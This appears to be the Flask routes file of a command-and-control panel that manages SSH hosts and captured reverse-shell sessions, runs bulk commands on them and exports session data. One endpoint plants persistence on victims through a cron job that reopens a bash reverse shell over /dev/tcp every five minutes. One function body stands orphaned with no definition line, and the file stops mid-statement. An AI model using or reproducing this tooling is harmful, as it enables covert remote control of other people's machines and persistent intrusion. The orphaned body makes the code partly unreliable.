from __future__ import annotations

import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from functools import wraps

from flask import Blueprint, abort, current_app, flash, jsonify, redirect, render_template, request, url_for
from flask_login import current_user, login_required, login_user, logout_user

from app.export_utils import ExportHelper
from app.extensions import db
from app.forms import (
    BulkCommandForm,
    BulkHostImportForm,
    BulkShellCommandForm,
    CommandForm,
    HostForm,
    LoginForm,
    ReverseShellForm,
    ShellCommandForm,
)
from app.models import CommandExecution, Host, ReverseShell, ShellExecution, User
from app.security import decrypt_secret, encrypt_secret
from app.shell_service import get_listener
from app.ssh_service import SSHEndpoint, run_ssh_command


auth_bp = Blueprint("auth", __name__)
main_bp = Blueprint("main", __name__)


PAGE_SIZE_DEFAULT = 15
LIVENESS_CHECK_COMMAND = "echo test"


def _page_arg(name: str = "page") -> int:
    try:
        return max(1, int(request.args.get(name, "1")))
    except ValueError:
        return 1


def role_required(*allowed_roles: str):
    def decorator(func):
        @wraps(func)
        def wrapped(*args, **kwargs):
            if not current_user.is_authenticated:
                return redirect(url_for("auth.login"))
            if current_user.role not in allowed_roles:
                abort(403)
            return func(*args, **kwargs)

        return wrapped

    return decorator


@auth_bp.route("/login", methods=["GET", "POST"])
def login():
    if current_user.is_authenticated:
        return redirect(url_for("main.dashboard"))

    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data.strip()).first()
        if user and user.check_password(form.password.data):
            login_user(user, remember=form.remember.data)
            flash("Login successful.", "success")
            next_url = request.args.get("next")
            return redirect(next_url or url_for("main.dashboard"))
        else:
            flash("Invalid username or password.", "danger")

    return render_template("login.html", form=form)


@auth_bp.route("/logout")
@login_required
def logout():
    logout_user()
    flash("Logged out.", "info")
    return redirect(url_for("auth.login"))


@auth_bp.route("/settings", methods=["GET", "POST"])
@login_required
def settings():
    """User profile and settings management."""
    if request.method == "POST":
        action = request.form.get("action")
        if action == "change_password":
            new_password = request.form.get("new_password", "")
            confirm_password = request.form.get("confirm_password", "")
            if len(new_password) < 8:
                flash("New password must be at least 8 characters.", "danger")
            elif new_password != confirm_password:
                flash("New passwords do not match.", "danger")
            else:
                current_user.set_password(new_password)
                db.session.commit()
                flash("Password changed successfully.", "success")
        elif action == "create_user" and current_user.role == "admin":
            from app.models import User
            username = request.form.get("new_username", "").strip()
            password = request.form.get("user_password", "")
            role = request.form.get("user_role", "operator")
            if not username or len(username) < 3:
                flash("Username must be at least 3 characters.", "danger")
            elif len(password) < 8:
                flash("Password must be at least 8 characters.", "danger")
            elif role not in ("admin", "operator"):
                flash("Invalid role.", "danger")
            elif User.query.filter_by(username=username).first():
                flash(f"User '{username}' already exists.", "danger")
            else:
                user = User(username=username, role=role)
                user.set_password(password)
                db.session.add(user)
                db.session.commit()
                flash(f"User '{username}' created.", "success")
        elif action == "delete_user" and current_user.role == "admin":
            from app.models import User, CommandExecution, ShellExecution
            user_id = request.form.get("user_id", type=int)
            if user_id and user_id != current_user.id:
                user = db.session.get(User, user_id)
                if user:
                    # Reassign executions to current admin before deleting
                    CommandExecution.query.filter_by(user_id=user.id).update({"user_id": current_user.id})
                    ShellExecution.query.filter_by(user_id=user.id).update({"user_id": current_user.id})
                    db.session.delete(user)
                    db.session.commit()
                    flash(f"User '{user.username}' deleted.", "success")
        elif action == "toggle_role" and current_user.role == "admin":
            from app.models import User
            user_id = request.form.get("user_id", type=int)
            if user_id and user_id != current_user.id:
                user = db.session.get(User, user_id)
                if user:
                    user.role = "operator" if user.role == "admin" else "admin"
                    db.session.commit()
                    flash(f"User '{user.username}' role changed to {user.role}.", "success")
        return redirect(url_for("auth.settings"))

    from app.models import User
    users = User.query.order_by(User.created_at).all() if current_user.role == "admin" else []
    return render_template("settings.html", users=users)


@main_bp.route("/")
@login_required
def dashboard():
    """Legacy SSH dashboard - redirect to unified dashboard."""
    return redirect(url_for("main.unified_dashboard", view="shells"))




def _validate_host_form(form: HostForm) -> bool:
    ok = True
    if form.auth_mode.data == "password" and not form.password.data:
        form.password.errors.append("Password is required when auth mode is password")
        ok = False

    if form.use_jump_host.data:
        if not form.jump_address.data or not form.jump_username.data:
            form.jump_address.errors.append("Jump host address and username are required")
            ok = False
        if form.jump_auth_mode.data == "password" and not form.jump_password.data:
            form.jump_password.errors.append("Jump host password is required when using jump password auth")
            ok = False

    return ok


def _apply_host_form(host: Host, form: HostForm) -> None:
    host.name = form.name.data.strip()
    host.address = form.address.data.strip()
    host.group_name = (form.group_name.data or "default").strip() or "default"
    host.port = form.port.data
    host.username = form.username.data.strip()
    host.auth_mode = form.auth_mode.data
    host.key_path = form.key_path.data.strip() or None
    if form.password.data:
        host.password_encrypted = encrypt_secret(form.password.data)
    host.strict_host_key = form.strict_host_key.data

    host.use_jump_host = form.use_jump_host.data
    host.jump_address = (form.jump_address.data or "").strip() or None
    host.jump_port = form.jump_port.data or 22
    host.jump_username = (form.jump_username.data or "").strip() or None
    host.jump_auth_mode = form.jump_auth_mode.data
    host.jump_key_path = (form.jump_key_path.data or "").strip() or None
    if form.jump_password.data:
        host.jump_password_encrypted = encrypt_secret(form.jump_password.data)

    host.is_active = form.is_active.data


@main_bp.route("/hosts/new", methods=["GET", "POST"])
@login_required
@role_required("admin")
def create_host():
    form = HostForm()
    if form.validate_on_submit() and _validate_host_form(form):
        host = Host()
        _apply_host_form(host, form)
        db.session.add(host)
        db.session.commit()
        flash("Host created.", "success")
        return redirect(url_for("main.dashboard"))

    return render_template("host_form.html", form=form, title="Add Host")


@main_bp.route("/hosts/import", methods=["GET", "POST"])
@login_required
@role_required("admin")
def import_hosts():
    form = BulkHostImportForm()
    if form.validate_on_submit():
        created = 0
        skipped = 0

        for idx, raw_line in enumerate(form.csv_rows.data.splitlines(), start=1):
            line = raw_line.strip()
            if not line:
                continue

            parts = [part.strip() for part in line.split(",")]
            if len(parts) < 3:
                skipped += 1
                flash(f"Line {idx}: skipped (requires at least name,address,username)", "warning")
                continue

            try:
                name, address, username = parts[:3]
                port = int(parts[3]) if len(parts) > 3 and parts[3] else 22
                auth_mode = parts[4] if len(parts) > 4 and parts[4] in {"key", "password"} else "key"
                key_path = parts[5] if len(parts) > 5 and parts[5] else None
                password = parts[6] if len(parts) > 6 and parts[6] else None
                group_name = parts[7] if len(parts) > 7 and parts[7] else "default"
                strict_host_key = True
                if len(parts) > 8 and parts[8]:
                    strict_host_key = parts[8].lower() not in {"false", "0", "no", "off"}

                if auth_mode == "password" and not password:
                    raise ValueError("password missing for password auth")

                db.session.add(
                    Host(
                        name=name,
                        address=address,
                        username=username,
                        port=port,
                        auth_mode=auth_mode,
                        key_path=key_path,
                        password_encrypted=encrypt_secret(password) if password else None,
                        group_name=group_name,
                        strict_host_key=strict_host_key,
                        is_active=True,
                    )
                )
                created += 1
            except Exception as exc:
                skipped += 1
                flash(f"Line {idx}: skipped ({exc})", "warning")

        db.session.commit()
        flash(f"Import complete: {created} host(s) created, {skipped} skipped.", "info")
        return redirect(url_for("main.dashboard"))

    return render_template("host_import.html", form=form)


@main_bp.route("/hosts/<int:host_id>/edit", methods=["GET", "POST"])
@login_required
@role_required("admin")
def edit_host(host_id: int):
    host = db.get_or_404(Host, host_id)
    form = HostForm(obj=host)

    if request.method == "GET":
        form.password.data = ""
        form.jump_password.data = ""

    if form.validate_on_submit() and _validate_host_form(form):
        _apply_host_form(host, form)
        db.session.commit()
        flash("Host updated.", "success")
        return redirect(url_for("main.dashboard"))

    return render_template("host_form.html", form=form, title=f"Edit Host: {host.name}")


def _build_target(host: Host) -> SSHEndpoint:
    return SSHEndpoint(
        host=host.address,
        port=host.port,
        username=host.username,
        auth_mode=host.auth_mode,
        key_path=host.key_path,
        password=decrypt_secret(host.password_encrypted) if host.auth_mode == "password" else None,
    )


def _build_jump(host: Host) -> SSHEndpoint | None:
    if not host.use_jump_host or not host.jump_address or not host.jump_username:
        return None

    return SSHEndpoint(
        host=host.jump_address,
        port=host.jump_port,
        username=host.jump_username,
        auth_mode=host.jump_auth_mode,
        key_path=host.jump_key_path,
        password=decrypt_secret(host.jump_password_encrypted) if host.jump_auth_mode == "password" else None,
    )


def _run_command_for_host(host: Host, command: str, timeout: int, target: SSHEndpoint, jump_host: SSHEndpoint | None):
    """
    Run SSH command for a host. Target and jump_host must be built before calling.
    
    Args:
        host: The Host object for which to run the command
        command: The shell command to execute
        timeout: Command execution timeout in seconds
        target: Pre-built SSHEndpoint for the target host
        jump_host: Pre-built SSHEndpoint for jump host, or None if not using jump host
        
    Returns:
        tuple: (host.id, SSHCommandResult)
    """
    return host.id, run_ssh_command(
        target=target,
        command=command,
        timeout=timeout,
        strict_host_key=host.strict_host_key,
        jump_host=jump_host,
    )


def _create_execution(host: Host, command: str, user_id: int) -> CommandExecution:
    execution = CommandExecution(
        host_id=host.id,
        user_id=user_id,
        command=command,
        status="running",
    )
    db.session.add(execution)
    db.session.commit()
    return execution


def _complete_execution(app, execution_id: int, result) -> None:
    """Complete an execution with results. Must be called with app context."""
    with app.app_context():
        execution = db.session.get(CommandExecution, execution_id)
        if execution:
            execution.stdout = result.stdout
            execution.stderr = result.stderr
            execution.return_code = result.return_code
            execution.status = "success" if result.return_code == 0 else "failed"
            execution.completed_at = datetime.utcnow()
            db.session.commit()


@main_bp.route("/operations/bulk", methods=["GET", "POST"])
@login_required
def bulk_operations():
    view_type = request.args.get("view", "shells").strip()
    ssh_form = BulkCommandForm()
    shell_form = BulkShellCommandForm()

    # SSH hosts
    hosts = Host.query.filter_by(is_active=True).order_by(Host.group_name.asc(), Host.name.asc()).all()
    ssh_form.host_ids.choices = [
        (host.id, f"[{host.group_name}] {host.name} ({host.username}@{host.address}:{host.port})") for host in hosts
    ]

    # Reverse shells
    shells = ReverseShell.query.filter_by(is_active=True).order_by(
        ReverseShell.group_name.asc(), ReverseShell.name.asc()
    ).all()
    listener = get_listener(current_app._get_current_object())
    active_shell_ids = set(listener.get_active_shells())
    shell_form.shell_ids.choices = [
        (shell.id, f"[{shell.group_name}] {shell.name} ({shell.address}) {'✓ online' if shell.id in active_shell_ids else '✗ offline'}")
        for shell in shells
    ]

    # Handle SSH bulk command submission
    if view_type == "ssh" and request.method == "POST" and ssh_form.validate_on_submit():
        selected_hosts = [host for host in hosts if host.id in ssh_form.host_ids.data]
        if not selected_hosts:
            flash("Select at least one host.", "warning")
            return redirect(url_for("main.bulk_operations", view="ssh"))

        command = ssh_form.command.data.strip()
        max_workers = min(max(len(selected_hosts), 1), 8)
        success_count = 0
        failure_count = 0

        timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
        user_id = current_user.id
        app = current_app._get_current_object()
        execution_map = {host.id: _create_execution(host, command, user_id) for host in selected_hosts}

        host_configs = {
            host.id: {
                'host': host,
                'target': _build_target(host),
                'jump_host': _build_jump(host)
            }
            for host in selected_hosts
        }

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(
                    _run_command_for_host,
                    config['host'],
                    command,
                    timeout,
                    config['target'],
                    config['jump_host']
                ): config['host']
                for config in host_configs.values()
            }
            for future in as_completed(futures):
                host = futures[future]
                execution = execution_map[host.id]
                try:
                    _, result = future.result()
                    _complete_execution(app, execution.id, result)
                    with app.app_context():
                        execution = db.session.get(CommandExecution, execution.id)
                        if execution.status == "success":
                            success_count += 1
                        else:
                            failure_count += 1
                except Exception as exc:
                    failure_count += 1
                    error_msg = f"Unexpected error during execution: {exc}"
                    with app.app_context():
                        exec_record = db.session.get(CommandExecution, execution.id)
                        if exec_record:
                            exec_record.status = "failed"
                            exec_record.stderr = error_msg
                            exec_record.completed_at = datetime.utcnow()
                            db.session.commit()
                    flash(f"{host.name}: {error_msg}", "danger")

        flash(f"SSH bulk execution finished: {success_count} success, {failure_count} failed.", "info")
        return redirect(url_for("main.bulk_operations", view="ssh"))

    # Handle reverse shell bulk command submission
    if view_type == "shells" and request.method == "POST" and shell_form.validate_on_submit():
        selected_shells = [shell for shell in shells if shell.id in shell_form.shell_ids.data]
        if not selected_shells:
            flash("Select at least one shell.", "warning")
            return redirect(url_for("main.bulk_operations", view="shells"))

        command = shell_form.command.data.strip()
        success_count = 0
        failure_count = 0

        for shell in selected_shells:
            if shell.id not in active_shell_ids:
                execution = ShellExecution(
                    shell_id=shell.id,
                    user_id=current_user.id,
                    command=command,
                    status="failed",
                    output="Shell is not connected",
                    started_at=datetime.utcnow(),
                    completed_at=datetime.utcnow(),
                )
                db.session.add(execution)
                failure_count += 1
                continue

            execution = ShellExecution(
                shell_id=shell.id,
                user_id=current_user.id,
                command=command,
                status="running",
            )
            db.session.add(execution)
            db.session.commit()

            try:
                success, output = listener.execute_command(shell.id, command, timeout=60)
                execution.output = output
                execution.status = "success" if success else "failed"
                execution.completed_at = datetime.utcnow()
                db.session.commit()

                if success:
                    success_count += 1
                else:
                    failure_count += 1
            except Exception as exc:
                execution.status = "failed"
                execution.output = f"Error: {exc}"
                execution.completed_at = datetime.utcnow()
                db.session.commit()
                failure_count += 1

        flash(f"Shell bulk execution finished: {success_count} success, {failure_count} failed.", "info")
        return redirect(url_for("main.bulk_operations", view="shells"))

    # Recent operations for both types
    ssh_run_page = _page_arg("ssh_page")
    ssh_runs_pagination = CommandExecution.query.order_by(CommandExecution.started_at.desc()).paginate(
        page=ssh_run_page, per_page=PAGE_SIZE_DEFAULT, error_out=False
    )
    shell_run_page = _page_arg("shell_page")
    shell_runs_pagination = ShellExecution.query.order_by(ShellExecution.started_at.desc()).paginate(
        page=shell_run_page, per_page=PAGE_SIZE_DEFAULT, error_out=False
    )
    return render_template(
        "bulk_operations.html",
        view_type=view_type,
        ssh_form=ssh_form,
        shell_form=shell_form,
        ssh_recent_bulk=ssh_runs_pagination.items,
        ssh_runs_pagination=ssh_runs_pagination,
        shell_recent_bulk=shell_runs_pagination.items,
        shell_runs_pagination=shell_runs_pagination,
    )


@main_bp.route("/hosts/<int:host_id>")
@login_required
def host_detail(host_id: int):
    host = db.get_or_404(Host, host_id)

    # Load older command history for the history section below the terminal
    old_executions = CommandExecution.query.filter_by(host_id=host.id).order_by(
        CommandExecution.started_at.desc()
    ).limit(50).all()

    return render_template(
        "host_detail.html",
        host=host,
        old_executions=old_executions,
    )


# ============================================================================
# Reverse Shell Routes
# ============================================================================



@main_bp.route("/shells/<int:shell_id>")
@login_required
def shell_detail(shell_id: int):
    """Interactive shell management page."""
    shell = db.get_or_404(ReverseShell, shell_id)

    # Check if shell is currently connected
    listener = get_listener(current_app._get_current_object())
    is_connected = shell_id in listener.get_active_shells()

    # Load older command history for the history section below the terminal
    old_executions = ShellExecution.query.filter_by(shell_id=shell.id).order_by(
        ShellExecution.started_at.desc()
    ).limit(50).all()

    return render_template(
        "shell_detail.html",
        shell=shell,
        is_connected=is_connected,
        old_executions=old_executions,
    )


@main_bp.route("/shells/<int:shell_id>/edit", methods=["GET", "POST"])
@login_required
@role_required("admin")
def edit_shell(shell_id: int):
    """Edit reverse shell metadata."""
    shell = db.get_or_404(ReverseShell, shell_id)
    form = ReverseShellForm(obj=shell)
    
    if form.validate_on_submit():
        shell.name = form.name.data.strip()
        shell.group_name = (form.group_name.data or "default").strip() or "default"
        shell.is_active = form.is_active.data
        db.session.commit()
        flash("Shell updated.", "success")
        return redirect(url_for("main.shell_detail", shell_id=shell.id))
    
    return render_template("shell_form.html", form=form, title=f"Edit Shell: {shell.name}")




@main_bp.route("/export/ssh-executions")
@login_required
def export_ssh_executions():
    """Export SSH command execution history as CSV."""
    import csv
    import io
    from flask import make_response
    
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Write header
    writer.writerow(['ID', 'Host', 'Group', 'User', 'Command', 'Status', 'Return Code', 
                     'Started At', 'Completed At', 'Duration (s)', 'Stdout', 'Stderr'])
    
    # Get all executions
    executions = CommandExecution.query.order_by(CommandExecution.started_at.desc()).all()
    
    for exec in executions:
        duration = ""
        if exec.completed_at and exec.started_at:
            delta = exec.completed_at - exec.started_at
            duration = str(delta.total_seconds())
        
        writer.writerow([
            exec.id,
            exec.host.name,
            exec.host.group_name,
            exec.user.username,
            exec.command,
            exec.status,
            exec.return_code,
            exec.started_at.strftime('%Y-%m-%d %H:%M:%S'),
            exec.completed_at.strftime('%Y-%m-%d %H:%M:%S') if exec.completed_at else '',
            duration,
            exec.stdout,
            exec.stderr,
        ])
    
    response = make_response(output.getvalue())
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = 'attachment; filename=ssh_executions.csv'
    return response


@main_bp.route("/export/shell-executions")
@login_required
def export_shell_executions():
    """Export reverse shell command execution history as CSV."""
    import csv
    import io
    from flask import make_response
    
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Write header
    writer.writerow(['ID', 'Shell', 'Group', 'Address', 'User', 'Command', 'Status',
                     'Started At', 'Completed At', 'Duration (s)', 'Output'])
    
    # Get all executions
    executions = ShellExecution.query.order_by(ShellExecution.started_at.desc()).all()
    
    for exec in executions:
        duration = ""
        if exec.completed_at and exec.started_at:
            delta = exec.completed_at - exec.started_at
            duration = str(delta.total_seconds())
        
        writer.writerow([
            exec.id,
            exec.shell.name,
            exec.shell.group_name,
            exec.shell.address,
            exec.user.username,
            exec.command,
            exec.status,
            exec.started_at.strftime('%Y-%m-%d %H:%M:%S'),
            exec.completed_at.strftime('%Y-%m-%d %H:%M:%S') if exec.completed_at else '',
            duration,
            exec.output,
        ])
    
    response = make_response(output.getvalue())
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = 'attachment; filename=shell_executions.csv'
    return response


# API Routes for Reverse Shell Management

@main_bp.route("/sessions", methods=["GET"])
@login_required
def sessions():
    """Redirect legacy sessions URL to the unified dashboard."""
    return redirect(url_for("main.unified_dashboard"))


@main_bp.route("/api/sessions", methods=["GET"])
@login_required
def api_sessions():
    """
    JSON API endpoint to list all reverse shell sessions.
    
    Returns:
        JSON array of session objects with metadata
    """
    group = request.args.get("group", "").strip()
    
    shell_query = ReverseShell.query.order_by(ReverseShell.last_seen.desc().nullslast(), ReverseShell.name.asc())
    if group:
        shell_query = shell_query.filter(ReverseShell.group_name == group)
    
    shells = shell_query.all()
    
    # Get active shells from listener
    listener = get_listener(current_app._get_current_object())
    active_shell_ids = listener.get_active_shells()
    
    sessions_data = []
    for shell in shells:
        sessions_data.append({
            'id': shell.id,
            'session_id': shell.session_id,
            'name': shell.name,
            'address': shell.address,
            'port': shell.port,
            'group_name': shell.group_name,
            'hostname': shell.hostname,
            'platform': shell.platform,
            'shell_user': shell.shell_user,
            'status': 'active' if shell.id in active_shell_ids else 'disconnected',
            'connected_at': shell.connected_at.isoformat() if shell.connected_at else None,
            'last_seen': shell.last_seen.isoformat() if shell.last_seen else None,
            'disconnected_at': shell.disconnected_at.isoformat() if shell.disconnected_at else None,
            'notes': shell.notes,
        })
    
    return jsonify({
        'success': True,
        'count': len(sessions_data),
        'sessions': sessions_data
    })


@main_bp.route("/execute/<session_id>", methods=["POST"])
@login_required
def execute_command_api(session_id: str):
    """
    Execute command on specific reverse shell session via API.
    
    Request JSON:
    {
        "command": "whoami"
    }
    
    Response JSON:
    {
        "success": true,
        "stdout": "root\\n",
        "stderr": "",
        "exit_code": 0,
        "execution_time": 0.234
    }
    
    Error Response:
    {
        "success": false,
        "error": "Session not found or disconnected"
    }
    """
    # Get command from JSON request
    data = request.get_json()
    if not data or 'command' not in data:
        return jsonify({
            'success': False,
            'error': 'Missing command in request body'
        }), 400
    
    command = data['command'].strip()
    if not command:
        return jsonify({
            'success': False,
            'error': 'Command cannot be empty'
        }), 400
    
    # Find shell by session_id
    shell = ReverseShell.query.filter_by(session_id=session_id).first()
    if not shell:
        return jsonify({
            'success': False,
            'error': 'Session not found'
        }), 404
    
    # Check if shell is currently connected
    listener = get_listener(current_app._get_current_object())
    if shell.id not in listener.get_active_shells():
        return jsonify({
            'success': False,
            'error': 'Session is not currently connected'
        }), 503
    
    # Create execution record
    execution = ShellExecution(
        shell_id=shell.id,
        user_id=current_user.id,
        command=command,
        status="running",
    )
    db.session.add(execution)
    db.session.commit()
    
    # Execute command and track time
    try:
        start_time = datetime.utcnow()
        timeout = current_app.config.get('SHELL_COMMAND_TIMEOUT', 120)
        success, output = listener.execute_command(shell.id, command, timeout=timeout)
        execution_time = (datetime.utcnow() - start_time).total_seconds()
        
        # Update execution record
        execution.output = output
        execution.stdout = output
        execution.status = "success" if success else "failed"
        execution.completed_at = datetime.utcnow()
        execution.execution_time = execution_time
        db.session.commit()
        
        # Return JSON response
        return jsonify({
            'success': success,
            'stdout': output if success else "",
            'stderr': "" if success else output,
            'exit_code': 0 if success else -1,
            'execution_time': execution_time,
            'execution_id': execution.id
        })
    except Exception as exc:
        execution.status = "failed"
        execution.output = f"Error: {exc}"
        execution.completed_at = datetime.utcnow()
        db.session.commit()
        return jsonify({
            'success': False,
            'error': f"Command execution failed: {exc}",
            'execution_id': execution.id
        }), 500


@main_bp.route("/api/ssh-execute/<int:host_id>", methods=["POST"])
@login_required
def ssh_execute_api(host_id: int):
    """Execute a command on an SSH host via JSON API (used by interactive terminal)."""
    host = db.session.get(Host, host_id)
    if not host:
        return jsonify({"success": False, "error": "Host not found"}), 404

    data = request.get_json()
    if not data or "command" not in data:
        return jsonify({"success": False, "error": "Missing command"}), 400

    command = data["command"].strip()
    if not command:
        return jsonify({"success": False, "error": "Command cannot be empty"}), 400

    execution = _create_execution(host, command, current_user.id)
    try:
        target = _build_target(host)
        jump_host = _build_jump(host)
        timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
        start_time = datetime.utcnow()
        _, result = _run_command_for_host(host, command, timeout, target, jump_host)
        execution_time = (datetime.utcnow() - start_time).total_seconds()

        execution.stdout = result.stdout
        execution.stderr = result.stderr
        execution.return_code = result.return_code
        execution.status = "success" if result.return_code == 0 else "failed"
        execution.completed_at = datetime.utcnow()
        db.session.commit()

        return jsonify({
            "success": True,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "exit_code": result.return_code,
            "execution_time": execution_time,
            "execution_id": execution.id,
        })
    except Exception as exc:
        execution.status = "failed"
        execution.stderr = f"Error: {exc}"
        execution.completed_at = datetime.utcnow()
        db.session.commit()
        return jsonify({"success": False, "error": str(exc)}), 500


@main_bp.route("/api/shell-status/<int:shell_id>")
@login_required
def shell_status_api(shell_id: int):
    """Check if a reverse shell is currently connected."""
    shell = db.session.get(ReverseShell, shell_id)
    if not shell:
        return jsonify({"error": "Shell not found"}), 404
    listener = get_listener(current_app._get_current_object())
    connected = shell_id in listener.get_active_shells()
    return jsonify({
        "connected": connected,
        "shell_id": shell_id,
        "address": shell.address,
        "hostname": shell.hostname,
        "last_seen": shell.last_seen.isoformat() if shell.last_seen else None,
    })


@main_bp.route("/api/history/ssh/<int:host_id>")
@login_required
def ssh_history_api(host_id: int):
    """Lazy-load older SSH command history for the interactive terminal."""
    host = db.session.get(Host, host_id)
    if not host:
        return jsonify({"error": "Host not found"}), 404

    offset = request.args.get("offset", 0, type=int)
    limit = min(request.args.get("limit", 20, type=int), 50)

    items = CommandExecution.query.filter_by(host_id=host.id).order_by(
        CommandExecution.started_at.desc()
    ).offset(offset).limit(limit).all()

    return jsonify({
        "items": [
            {"command": e.command, "stdout": e.stdout or "", "stderr": e.stderr or ""}
            for e in items
        ],
        "offset": offset,
        "limit": limit,
    })


@main_bp.route("/api/history/reverse/<int:shell_id>")
@login_required
def reverse_history_api(shell_id: int):
    """Lazy-load older reverse shell command history for the interactive terminal."""
    shell = db.session.get(ReverseShell, shell_id)
    if not shell:
        return jsonify({"error": "Shell not found"}), 404

    offset = request.args.get("offset", 0, type=int)
    limit = min(request.args.get("limit", 20, type=int), 50)

    items = ShellExecution.query.filter_by(shell_id=shell.id).order_by(
        ShellExecution.started_at.desc()
    ).offset(offset).limit(limit).all()

    return jsonify({
        "items": [
            {"command": e.command, "stdout": e.output or e.stdout or "", "stderr": e.stderr or ""}
            for e in items
        ],
        "offset": offset,
        "limit": limit,
    })


@main_bp.route("/api/clear-history/ssh/<int:host_id>", methods=["POST"])
@login_required
@role_required("admin")
def clear_ssh_history(host_id: int):
    """Clear command history for an SSH host."""
    host = db.session.get(Host, host_id)
    if not host:
        return jsonify({"error": "Host not found"}), 404
    CommandExecution.query.filter_by(host_id=host.id).delete()
    db.session.commit()
    return jsonify({"success": True})


@main_bp.route("/api/clear-history/shell/<int:shell_id>", methods=["POST"])
@login_required
@role_required("admin")
def clear_shell_history(shell_id: int):
    """Clear command history for a reverse shell."""
    shell = db.session.get(ReverseShell, shell_id)
    if not shell:
        return jsonify({"error": "Shell not found"}), 404
    ShellExecution.query.filter_by(shell_id=shell.id).delete()
    db.session.commit()
    return jsonify({"success": True})


@main_bp.route("/api/shell-persistence/<int:shell_id>", methods=["POST"])
@login_required
def shell_persistence_api(shell_id: int):
    """Enable or remove persistence on a reverse shell.

    Enables: creates a cron job or systemd user timer that re-runs a
    reconnecting reverse shell payload periodically.
    Removes: deletes the cron entry / timer created above.
    """
    shell = db.session.get(ReverseShell, shell_id)
    if not shell:
        return jsonify({"success": False, "error": "Shell not found"}), 404

    listener = get_listener(current_app._get_current_object())
    if shell_id not in listener.get_active_shells():
        return jsonify({"success": False, "error": "Shell is not connected"}), 503

    data = request.get_json() or {}
    action = data.get("action", "enable")  # 'enable' or 'remove'
    lhost = data.get("lhost", "")
    lport = data.get("lport", "")

    if action == "enable" and (not lhost or not lport):
        return jsonify({"success": False, "error": "lhost and lport are required to enable persistence"}), 400

    conn = listener.connections.get(shell_id)
    if not conn or not conn.is_active:
        return jsonify({"success": False, "error": "Shell connection not active"}), 503

    try:
        if action == "enable":
            # Build a persistence payload that works across common scenarios
            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            cron_line = f"*/5 * * * * {payload} 2>/dev/null"
            # Add to crontab (idempotent — remove old entry first, then add)
            cmd = (
                f"(crontab -l 2>/dev/null | grep -v 'c2_persist'; "
                f"echo '# c2_persist'; "
                f"echo '{cron_line} # c2_persist') | crontab - 2>/dev/null && echo 'PERSIST_OK'"
            )
        else:
            # Remove persistence
            cmd = (
                "(crontab -l 2>/dev/null | grep -v 'c2_persist' | crontab - 2>/dev/null) && echo 'PERSIST_REMOVED'"
            )

        conn.conn.settimeout(10)
        conn.conn.sendall((cmd + "\n").encode("utf-8"))

        time.sleep(2)

        output = ""
        conn.conn.settimeout(1)
        try:
            while True:
                chunk = conn.conn.recv(4096)
                if not chunk:
                    break
                output += chunk.decode("utf-8", errors="replace")
        except Exception:
            pass

        conn.conn.settimeout(30)

        if action == "enable":
            ok = "PERSIST_OK" in output
        else:
            ok = "PERSIST_REMOVED" in output

        return jsonify({
            "success": ok,
            "action": action,
            "output": output,
            "message": (
                "Persistence enabled — cron job will reconnect every 5 minutes"
                if action == "enable" and ok
                else "Persistence removed" if action == "remove" and ok
                else "Command executed but result could not be confirmed"
            ),
        })
    except Exception as exc:
        return jsonify({"success": False, "error": str(exc)}), 500



    """Execute a command on a reverse shell via JSON API (used by interactive terminal)."""
    shell = db.session.get(ReverseShell, shell_id)
    if not shell:
        return jsonify({"success": False, "error": "Shell not found"}), 404

    listener = get_listener(current_app._get_current_object())
    if shell_id not in listener.get_active_shells():
        return jsonify({"success": False, "error": "Shell is not connected"}), 503

    data = request.get_json()
    if not data or "command" not in data:
        return jsonify({"success": False, "error": "Missing command"}), 400

    command = data["command"].strip()
    if not command:
        return jsonify({"success": False, "error": "Command cannot be empty"}), 400

    execution = ShellExecution(
        shell_id=shell.id,
        user_id=current_user.id,
        command=command,
        status="running",
    )
    db.session.add(execution)
    db.session.commit()

    try:
        start_time = datetime.utcnow()
        timeout = current_app.config.get("SHELL_COMMAND_TIMEOUT", 120)
        success, output = listener.execute_command(shell_id, command, timeout=timeout)
        execution_time = (datetime.utcnow() - start_time).total_seconds()

        execution.output = output
        execution.stdout = output
        execution.status = "success" if success else "failed"
        execution.completed_at = datetime.utcnow()
        execution.execution_time = execution_time
        db.session.commit()

        return jsonify({
            "success": success,
            "stdout": output if success else "",
            "stderr": "" if success else output,
            "exit_code": 0 if success else -1,
            "execution_time": execution_time,
            "execution_id": execution.id,
        })
    except Exception as exc:
        execution.status = "failed"
        execution.output = f"Error: {exc}"
        execution.completed_at = datetime.utcnow()
        db.session.commit()
        return jsonify({"success": False, "error": str(exc)}), 500


# Enhanced Export Routes

@main_bp.route("/export/sessions/<format>")
@login_required
def export_sessions(format: str):
    """
    Export reverse shell sessions in various formats.
    Supports: csv, json, xlsx
    """
    shells = ReverseShell.query.order_by(ReverseShell.last_seen.desc().nullslast()).all()
    
    # Get active shells
    listener = get_listener(current_app._get_current_object())
    active_shell_ids = set(listener.get_active_shells())
    
    # Prepare data
    sessions_data = []
    for shell in shells:
        sessions_data.append({
            'id': shell.id,
            'session_id': shell.session_id or '',
            'name': shell.name,
            'address': shell.address,
            'port': shell.port,
            'group_name': shell.group_name,
            'hostname': shell.hostname or '',
            'platform': shell.platform or '',
            'shell_user': shell.shell_user or '',
            'status': 'active' if shell.id in active_shell_ids else 'disconnected',
            'connected_at': shell.connected_at.strftime('%Y-%m-%d %H:%M:%S') if shell.connected_at else '',
            'last_seen': shell.last_seen.strftime('%Y-%m-%d %H:%M:%S') if shell.last_seen else '',
            'disconnected_at': shell.disconnected_at.strftime('%Y-%m-%d %H:%M:%S') if shell.disconnected_at else '',
            'notes': shell.notes or '',
        })
    
    if format.lower() == 'json':
        return ExportHelper.to_json_response(sessions_data, 'sessions.json')
    elif format.lower() in ['xlsx', 'excel']:
        return ExportHelper.to_excel_response(sessions_data, 'sessions.xlsx', 'Reverse Shell Sessions')
    else:  # default to CSV
        fieldnames = ['id', 'session_id', 'name', 'address', 'port', 'group_name', 'hostname', 
